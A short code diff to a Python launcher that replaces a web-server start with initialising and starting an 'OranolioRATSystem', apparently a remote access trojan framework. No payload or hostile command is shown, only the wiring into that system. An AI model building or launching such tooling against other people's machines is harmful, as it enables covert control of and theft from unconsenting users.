@@ -44,17 +44,12 @@ def start_web_interface():
     """Start the web interface"""
     try:
         print("🌐 Starting Web Interface...")
-        from web_app_real import app, socketio
+        from main_entry import OranolioRATSystem
         
-        # Start the web server
-        socketio.run(
-            app, 
-            host='0.0.0.0', 
-            port=5000, 
-            debug=False, 
-            use_reloader=False,
-            allow_unsafe_werkzeug=True
-        )
+        # Start the complete system
+        system = OranolioRATSystem()
+        system.initialize()
+        system.start()
     except Exception as e:
         print(f"❌ Error starting web interface: {e}")
         import traceback
